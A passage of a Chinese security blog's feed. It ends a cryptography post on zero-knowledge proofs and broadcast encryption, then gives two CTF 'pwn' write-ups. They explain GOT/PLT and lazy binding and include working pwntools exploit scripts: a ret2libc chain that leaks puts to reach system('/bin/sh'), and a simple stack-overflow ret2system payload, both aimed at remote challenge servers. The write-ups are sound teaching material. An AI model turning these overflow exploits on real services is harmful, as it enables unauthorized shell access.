B把自己的私钥给A，A用公钥对某个数据加密，然后用B的私钥解密，如果正确，则证明对方确实是B。</p><p>     ② A给出一个随机值，并使用B的公钥对其加密，然后将加密后的数据交给B，B用自己的私钥解密并展示给A，如果与A给出的随机值相同，则证明对方是B。</p><p>后面的方法属于零知识证明。</p><p><br>3.有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A要向B证明自己拥有该门的钥匙。采用零知识证明，则B看着A从入口进入走廊，然后又从出口走出走廊，这时B没有得到任何关于这个钥匙的信息，但是完全可以证明A拥有钥匙。</p></blockquote><h3 id="font-color-brown三-广播加密font"><a class="markdownIt-Anchor" href="#font-color-brown三-广播加密font"></a> <font color="brown">三、广播加密</font></h3><h4 id="font-color-navy1什么是广播加密font"><a class="markdownIt-Anchor" href="#font-color-navy1什么是广播加密font"></a> <font color="navy">1.什么是广播加密？</font></h4><blockquote><p>      广播加密是一种在不安全信道上给一组用户传输加密信息的密码体制，它可使发送者选取任意用户集合进行广播加密，只有授权用户才能够解密密文。广播加密有着广泛的实际应用背景，例如，<strong>数字版权管理、付费电视、卫星广播通信</strong>等。一个广播加密方案满足完全抗同谋攻击（fully collusion resistant），即所有撤销用户合作，也无法解密密文。对于一个公钥广播加密方案，用户私钥长度、系统公钥长度、密文长度以及加密解密计算复杂度是衡量性能优劣的重要标准。</p></blockquote><h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3><ul><li><a href="https://blog.csdn.net/jerry81333/article/details/76141596" target="_blank" rel="noopener">变色龙哈希函数 Chameleon Hash 可变型区块链</a></li><li><a href="https://blog.csdn.net/liuweiran900217/article/details/21819637" target="_blank" rel="noopener">Cryptography - Chameleon Hash</a></li><li><a href="https://www.zhihu.com/question/38545889" target="_blank" rel="noopener">变色龙哈希函数是什么？</a></li><li><a href="https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E" target="_blank" rel="noopener">零知识证明</a></li><li><a href="https://zhuanlan.zhihu.com/p/24440530" target="_blank" rel="noopener">不是程序员也能看懂的ZCash零知识证明</a></li><li><a href="https://www.leiphone.com/news/201803/egFu5MwIsweBU2WY.html" target="_blank" rel="noopener">零知识证明（Zero-Knowledge Proof）原理详解：非交互式证明实现自动验证防止作假</a></li><li><a href="https://blog.csdn.net/sxjinmingjie/article/details/77746232" target="_blank" rel="noopener">区块链解读-零知识证明</a></li><li><a href="https://www.jiamisoft.com/blog/3400-guangbojiami.html" target="_blank" rel="noopener">广播加密</a></li><li><a href="https://crypto.stackovernet.com/cn/q/5241" target="_blank" rel="noopener">误解广播加密</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-变色龙哈希chameleon-hashfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-变色龙哈希chameleon-hashfont&quot;&gt;&lt;/a&gt; &lt;font
      
    
    </summary>
    
    
      <category term="密码学" scheme="https://muzibing.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>pwn-ROP(GOT表泄露)</title>
    <link href="https://muzibing.github.io/2019/10/08/2019.09.28%EF%BC%8884%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/08/2019.09.28（84）/</id>
    <published>2019-10-07T16:00:00.000Z</published>
    <updated>2019-10-08T02:26:39.559Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><h4 id="font-color-navy1got-表-plt-表和-libc-库的相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy1got-表-plt-表和-libc-库的相关知识font"></a> <font color="navy">1.GOT 表、PLT 表和 libc 库的相关知识</font></h4><p><font color="red">① 什么是 GOT 表？</font></p><blockquote><p>GOT(Global Offset Table) 表，即<strong>全局偏移量表</strong>，里面是函数在 libc 库中的绝对地址。</p></blockquote><p><font color="red">② 什么是 PLT 表？</font></p><blockquote><p>PLT(Procedure Link Table) 表，即<strong>程序链接表</strong>，里面是函数在 GOT 表中的地址。</p></blockquote><p><font color="red">③ 什么是 libc 库？</font></p><blockquote><p><strong>libc是Linux下的ANSI C的函数库</strong>。ANSI C是基本的C语言函数库，包含了C语言最基本的<a href="https://baike.baidu.com/item/%E5%BA%93%E5%87%BD%E6%95%B0" target="_blank" rel="noopener">库函数</a>。这个库可以根据 头文件划分为 15 个部分，其中包括：字符类型 ()、<a href="https://baike.baidu.com/item/%E9%94%99%E8%AF%AF%E7%A0%81" target="_blank" rel="noopener">错误码</a>()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 () 等等。这在其他的C语言的IDE中都是有的。（来源百度百科词条）</p></blockquote><p><font color="red">④ GOT、PLT 和 libc 库的联系</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to World of PLT and GOT\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">"/tmp/text"</span>,File);</span><br><span class="line">    write(fd,<span class="keyword">void</span> *buf,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">write_file();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如上图所示， write_file 函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，假设上述的示例 test 在运行过程中，调用方（如 print_banner 和 write_file )是如何通过 PLT 和 GOT 穿针引线之后，最终调用到 glibc 的 printf 和 write 函数的？</p><p><img src="/images/84-1.jpg" alt></p></blockquote><h4 id="font-color-navy2重定位font"><a class="markdownIt-Anchor" href="#font-color-navy2重定位font"></a> <font color="navy">2.重定位</font></h4><blockquote><p>重定位就是把程序的<a href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/5624042" target="_blank" rel="noopener">逻辑地址空间</a>变换成内存中的实际<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129" target="_blank" rel="noopener">物理地址</a>空间的过程。它是实现<a href="https://baike.baidu.com/item/%E5%A4%9A%E9%81%93%E7%A8%8B%E5%BA%8F/8192392" target="_blank" rel="noopener">多道程序</a>在内存中同时运行的基础。重定位有两种，分别是<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D/9849090" target="_blank" rel="noopener">动态重定位</a>与<a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D/8785916" target="_blank" rel="noopener">静态重定位</a>。</p><p>① <a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D" target="_blank" rel="noopener">静态重定位</a>：即在程序装入内存的过程中完成，是指在程序开始运行前，程序中的各个地址有关的项均已完成重定位，地址变换通常是在装入时一次完成的，以后不再改变，故成为静态重定位。</p><p>② <a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D" target="_blank" rel="noopener">动态重定位</a>：它不是在程序装入内存时完成的，而是CPU每次访问内存时 由<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">动态地址</a>变换机构（硬件）自动进行把相对地址转换为<a href="https://baike.baidu.com/item/%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">绝对地址</a>。动态重定位需要软件和硬件相互配合完成。</p><p>（以上来源百度百科词条）</p><p>关于重定位的还有以下几篇文章：</p><p><a href="https://blog.csdn.net/cherisegege/article/details/80708143" target="_blank" rel="noopener">① 什么是重定位？为什么需要重定位？</a> 强烈推荐看一下，因为通过这篇文章又引入了几个概念和问题：</p><blockquote><p>概念 1：链接地址和运行地址</p><p>概念 2：位置有关码与位置无关码</p><p>问题 1：链接地址跟运行地址不同的情况下会出现什么情况？</p><p>问题 2：为什么会出现链接地址跟运行地址不同的情况？</p><p>问题 3：什么是重定位？</p><p>问题 4：为什么需要重定位？</p></blockquote><p><a href="https://segmentfault.com/a/1190000016433947" target="_blank" rel="noopener">② 彻底理解链接器：四，重定位</a></p></blockquote><h3 id="font-color-navy3延迟绑定font"><a class="markdownIt-Anchor" href="#font-color-navy3延迟绑定font"></a> <font color="navy">3.延迟绑定</font></h3><blockquote><p>关于延迟绑定的相关内容与动态链接有者密不可分的联系，我只简单地介绍一下延迟绑定的目的和实现原理。</p><p><font color="red">① 延迟绑定的目的</font></p><p>    第一次调用函数时，由连接器负责重定位，第二次调用函数时直接调用，不必经过连接器。</p><p><font color="red">② 延迟绑定的实现原理</font></p><p>    延迟绑定PLT（Procedure Linkage Table）在GOT表基础又做了一次间接跳转。即模块内关于外部函数的地址引用，这下并不直接通过GOT跳转，而是通过一个叫做PLT项的结构来进行，每个外部函数引用都对应PLT表中的一个表项，比如bar()函数在PLT表中的表项称为bar@plt，实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; bar@plt:</span><br><span class="line">&gt; jmp    *(bar@GOT)</span><br><span class="line">&gt; push   n</span><br><span class="line">&gt; push   moduleID</span><br><span class="line">&gt; jump   _dl_runtime_resolve</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>    但所谓延迟绑定，即是指在初始未遇到bar()函数之前，GOT表中并无函数bar()的地址信息，而是将后续push n指令的地址填充到GOT中bar()表项中，这时jmp指令将会直接跳转继续执行后续的push n…等指令，该步操作很简单也不需要遍历寻址目标符号，故而代价很低，只需要在生成桩代码时将push n指令位置填入即可。而后的操作便是正常参数压栈工作，其中push n中的参数n对应的是bar()函数符号在重定位表.rel.plt中的下标，push moduleID中的moduleID则是模块ID，调用_dl_runtime_resolve函数完成具体的符号解析和重定位工作，将外部模块中bar()函数的真正地址填入GOT对应的bar@GOT表项。这样当我们下次再次回到PLT表bar@plt表项中转时，便会进入正常的函数调用过程，而不会继续执行push n及之后的代码，那段代码只会在符号未被解析时执行only一次。</p><p><font color="red">更多关于延迟绑定和动态链接的文章如下：</font></p><p><a href="https://blog.csdn.net/roger_ranger/article/details/78903976" target="_blank" rel="noopener">① Linux动态链接之二：优化加速之延迟绑定PLT</a></p><p><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">② 延迟绑定的实现</a></p></blockquote><h3 id="font-color-brown二-解题思路font"><a class="markdownIt-Anchor" href="#font-color-brown二-解题思路font"></a> <font color="brown">二、解题思路</font></h3><h4 id="font-color-navy1file-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy1file-pwn2font"></a> <font color="navy">1.file pwn2</font></h4><p><img src="/images/84-2.jpg" alt></p><blockquote><p>从上面得到的信息是：<code>pwn2 是一个 32 位 可执行的 ELF 文件，并且是动态连接的</code></p></blockquote><h3 id="font-color-navy2check-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy2check-pwn2font"></a> <font color="navy">2.check pwn2</font></h3><p><img src="/images/84-3.jpg" alt></p><blockquote><p>从上面可以得到的信息是：</p><ul><li>开启了 NX，表示我们不能通过栈溢出来执行 shellcode</li><li>没有开启栈保护，我们可以利用栈溢出这个漏洞的（Stack:    No canary found）</li><li>我们对 GOT 表具有写的权限（RELRO:    Partial RELRO）</li></ul></blockquote><h4 id="font-color-navy3ida-反编译-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy3ida-反编译-pwn2font"></a> <font color="navy">3.IDA 反编译 pwn2</font></h4><blockquote><p><font color="red">① 查找漏洞</font></p><p>通过 IDA 对 pwn2 的处理后，我们可以在函数 <code>sub_80484EA()</code> 中看到可能出现的漏洞——<code>read() 函数</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-58h]@1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">&gt; <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>我们可以通过简单的计算：</p><p>     ☛ buf 缓冲区可以读入的数据有：0xC8u（十进制为：200个字节）</p><p>     ☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88）</p><p>所以我们输入的数据大小超过了 buf 的实际空间大小，如下图所示：</p><p><img src="/images/84-4.png" alt></p><p><font color="red">② 查找 system() 和 /bin/sh </font></p><p>通过在 IDA 里面查找，我们没有找到 system() 和 \bin\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh：我们可以通过 <code>ROPgadget</code> 命令来查找 <code>system()</code> 和 <code>/bin/sh</code></p><center>ROPgadget --binary pwn2 --string 'system'</center>但是并没有找到该字符：<p><img src="/images/84-8.jpg" alt></p></blockquote><h3 id="font-color-navy4解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy4解题思路font"></a> <font color="navy">4.解题思路</font></h3><blockquote><p>通过我们对文件 <code>pwn2</code> 进行分析后，我们没有发现 system() 和/bin/sh，那么我们该怎么得到这两个的地址呢？</p><p><font color="red">① 查看 pwn2 用到的库</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ldd pwn2</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><img src="/images/84-4.jpg" alt></p><p>从上面的得到的信息可以看出，文件 <code>pwn2</code> 中用到的库有 <code>linux-gate.so.1</code> 、<code>libc.so.6</code>、<code>ld-linux.so.2</code>，下面我们来看看这三个库中有什么？</p><p>    ☛ <code>linux-gate.so.1</code>：这个所谓的&quot;linux-gate.so.1&quot;的内容就是内核映射的代码，系统中其实并不存在这样一个链接库文件，它的名字是由ldd自己起的，而在老版本的ldd中，虽然能够检测到这段代码，但是由于没有命名而且在系统中找不到对应链接库文件，所以会有一些显示上的问题。</p><p>    ☛ <code>libc.so.6</code>：我们通过查看<code>libc.so.6</code>库，可以看到这个库包含了 <code>pwn2</code> 程序中出现的<code>puts()函数</code>，以及我们想找的 <code>system()</code>函数以及<code>/bin/sh</code></p><p><img src="/images/84-5.jpg" alt></p><p><img src="/images/84-6.jpg" alt></p><p>    ☛ <code>ld-linux.so.2</code>：这是glibc的库文件，一般链接到相应版本的ld-xxx.so上，我没有具体的查看封装的函数。</p><p><br>下面的是我们计算机中有的库：</p><p><img src="/images/84-7.jpg" alt></p><p><br><font color="red">② 获得 system 和 /bin/sh 的地址</font></p><p>    我们可以利用<strong>重定位</strong>，来泄露 <code>puts()</code> 函数的 got 表，以及通过puts() 函数在 libc.so.6 中的偏移地址，来得到 libc  的<strong>基地址</strong>。</p><p>    我们通过得到的基地址，再通过获取 <code>system()</code> 和 <code>/bin/sh</code> 的偏移地址，我们就可以得到 <code>system()</code> 和 <code>/bin/sh</code> 的实际地址。</p><p>    <font color="navy">libcbase = puts_addr - libc.dump(‘puts’)</font><br>    <font color="navy">system_addr = libcbase + libc.dump(‘system’)</font><br>    <font color="navy">binsh_addr = libcbase + libc.dump(‘str_bin_sh’)</font></p><p>    我们可以通过 <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LicSearcher</a> 根据 <code>puts()</code> 函数的版本，来查找 <code>puts()</code> 、<code>system()</code> 和 <code>/bin/sh</code>的偏移</p></blockquote><h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3><h4 id="font-color-navy1编写脚本font"><a class="markdownIt-Anchor" href="#font-color-navy1编写脚本font"></a> <font color="navy">1.编写脚本</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">pwn2 = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9991</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of "puts"</span></span><br><span class="line"></span><br><span class="line">puts_got = pwn2.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = pwn2.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First payload (the function is to get address of puts)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"put_address:"</span> + hex(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span> + hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span> + hex(puts_plt)</span><br><span class="line"><span class="comment">#print libc.dump("system")</span></span><br><span class="line"><span class="comment">#print libc.dump("str_bin_sh")</span></span><br><span class="line"><span class="comment">#print libc.dump("_libc_start_main")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#According the address of offset in libc, we can gain the address of system and binsh</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc.dump(puts):"</span> + hex(libc.dump(<span class="string">'puts'</span>))</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------------------get_shell----------------------------------"</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="font-color-navy2执行脚本font"><a class="markdownIt-Anchor" href="#font-color-navy2执行脚本font"></a> <font color="navy">2.执行脚本</font></h4><p><img src="/images/84-10.jpg" alt></p><h4 id="font-color-navy3查看当前目录下的文件夹font"><a class="markdownIt-Anchor" href="#font-color-navy3查看当前目录下的文件夹font"></a> <font color="navy">3.查看当前目录下的文件夹</font></h4><p><img src="/images/84-11.jpg" alt></p><h4 id="font-color-navy4获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy4获取-flagfont"></a> <font color="navy">4.获取 flag</font></h4><p><img src="/images/84-12.jpg" alt></p><h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3><ul><li><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">延迟绑定的实现</a></li><li><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a>★</li><li><a href="https://www.zhihu.com/question/21249496" target="_blank" rel="noopener">Linux动态链接为什么要用PLT和GOT表？</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn-bof（基础类型题目）</title>
    <link href="https://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/24/2019.09.24（83）/</id>
    <published>2019-09-23T16:00:00.000Z</published>
    <updated>2019-11-06T14:13:33.116Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><h4 id="font-color-navy1内存中栈的结构font"><a class="markdownIt-Anchor" href="#font-color-navy1内存中栈的结构font"></a> <font color="navy">1.内存中栈的结构</font></h4><p><img src="/images/83-1.jpg" alt></p><blockquote><p>正如上图所示，栈是由“由高地址向低地址”方向生长。</p></blockquote><h4 id="font-color-navy2常见的漏洞类型font"><a class="markdownIt-Anchor" href="#font-color-navy2常见的漏洞类型font"></a> <font color="navy">2.常见的漏洞类型</font></h4><blockquote><p>常见的漏洞类型有如下几种：</p><p><font color="orage"><strong>① 逻辑错误</strong></font></p><p><br><font color="orage"><strong>② 内存破坏</strong></font></p><p>    ✦ <font color="red">栈溢出</font></p><p>    ✦ 整数溢出</p><p>    ✦ 格式化字符串</p><p>    ✦ 堆溢出</p><p>    ✦ 释放后使用</p></blockquote><h3 id="font-color-brown二-解题思路font"><a class="markdownIt-Anchor" href="#font-color-brown二-解题思路font"></a> <font color="brown">二、解题思路</font></h3><h4 id="font-color-navy1寻找漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy1寻找漏洞font"></a> <font color="navy">1.寻找漏洞</font></h4><blockquote><p>通过 IDA Pro 对文件进行逆向，通过对伪代码的分析，我们可以看到在函数 <code>sub_8048573</code> 中，有一个明显的漏洞——read（）函数。我们是如何知道该处是一个漏洞呢？</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048573()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  sub_804851B();</span><br><span class="line">  sub_804854A();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"can you pwn me?"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的伪代码，我们可以得出：</p><p>    ① 我们可以往 <code>buf</code> 缓存中读入 <code>0x100u</code> 长的数据；</p><p>    ② 但是 <code>buf</code> 缓存离 <code>ebp</code> 的偏移只有 <code>0x1c</code> 长；</p><p>因为 <code>0x100u</code> &gt; <code>0x1c</code> ，意味者我们可以往 <code>buf</code> 中输入 256 大小的的数据，但是会产生一处的现象，出现我们输入的数据覆盖掉 ebp 以上的的数据。</p></blockquote><h4 id="font-color-navy2构造-payloadfont"><a class="markdownIt-Anchor" href="#font-color-navy2构造-payloadfont"></a> <font color="navy">2.构造 payload</font></h4><blockquote><p>现在我来画个示意图，来帮助大家理解：</p></blockquote><p><img src="/images/83-2.png" alt></p><blockquote><p>从上图我们可以知道构造 payload 的思路：</p><p>    ① 我们之所以要利用这个漏洞，是想要通过覆盖 <code>return address</code>  的内容，从而跳转到我们想要执行的函数上；</p><p>    ② 我们首先要填充 <code>buf</code> 和 <code>ebp</code> 部分，也就是 0x1c + 4 = 32 byte</p><p>    ③ 我们想要获取 <code>shell</code> ，所以在 <code>return address</code> 那里，我们要让它返回的地址是 <code>system()</code> 函数的地址；</p><p>    ④ 因为 pwn 是一个 32 位的 ELF 文件，所以我们还需要填充 4 个字节的数据；</p><p>    ⑤ 要想获得 <code>shell</code> ，我们就必须执行 <code>system（‘/bin/sh’）</code> 函数，所以下面我们还得填充 <code>system（）</code> 函数得参数地址；</p><p>经过上述的分析，我们可以得到下述的示意图：、</p></blockquote><p><img src="/images/83-3.png" alt></p><h3 id="font-color-brown三-解题过程font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题过程font"></a> <font color="brown">三、解题过程</font></h3><h4 id="font-color-navy1构造-payloadfont"><a class="markdownIt-Anchor" href="#font-color-navy1构造-payloadfont"></a> <font color="navy">1.构造 payload</font></h4><blockquote><p>payload = ‘a’ * 32 + p32(system_address) + ‘a’ * 4 + p32(bin/sh_address)</p><p><font color="red">注</font>：system_address 后面之所以还要加上一个 4 字节的填充，是因为在调用 system 函数后，再返回到我的返回地址(<code>‘a’ * 4</code>：充当的是虚拟的返回地址。我们只要控制在 4 个字节里就 ok！)。再填写我们需要压入栈中的参数 <code>/bin/sh</code> 。</p></blockquote><h4 id="font-color-navy2查找-system-函数和-binsh-的地址font"><a class="markdownIt-Anchor" href="#font-color-navy2查找-system-函数和-binsh-的地址font"></a> <font color="navy">2.查找 system 函数和 /bin/sh 的地址</font></h4><blockquote><p>在 IDA 中，可以查到 <code>system</code>  和 <code>/bin/sh</code> 的地址，如下：</p><p>a<img src="/images/83-4.jpg" alt></p><p><img src="/images/83-5.jpg" alt></p></blockquote><h4 id="font-color-navy3写-expfont"><a class="markdownIt-Anchor" href="#font-color-navy3写-expfont"></a> <font color="navy">3.写 exp</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9990</span>)</span><br><span class="line">system_address = <span class="number">0x080483F0</span></span><br><span class="line">bin_sh_address = <span class="number">0x0804A02C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span> + p32(system_address) + <span class="string">'b'</span>*<span class="number">4</span> + p32(bin_sh_address)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="font-color-navy4运行脚本得到-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy4运行脚本得到-flagfont"></a> <font color="navy">4.运行脚本，得到 